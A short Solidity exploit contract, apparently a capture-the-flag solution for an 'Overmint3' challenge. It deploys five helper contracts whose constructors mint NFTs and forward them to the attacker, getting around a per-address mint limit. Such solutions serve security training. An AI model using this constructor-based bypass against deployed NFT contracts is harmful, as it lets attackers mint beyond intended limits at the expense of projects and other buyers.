// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../Overmint3.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Minter {
    constructor(address victim, address minter, uint256 tokenId) {
        Overmint3(victim).mint();
        Overmint3(victim).safeTransferFrom(address(this), minter, tokenId);
    }
}
contract Overmint3Attacker {
    constructor(address victim) {
        for (uint256 i = 1; i < 6; i++) {
            bytes memory bytecode = abi.encodePacked(type(Minter).creationCode, abi.encode(victim, msg.sender, i));

            address deployed;
            assembly {
                deployed := create(0, add(bytecode, 0x20), mload(bytecode))
                if iszero(deployed) {
                    revert(0, 0)
                }
            }
        }
    }
}
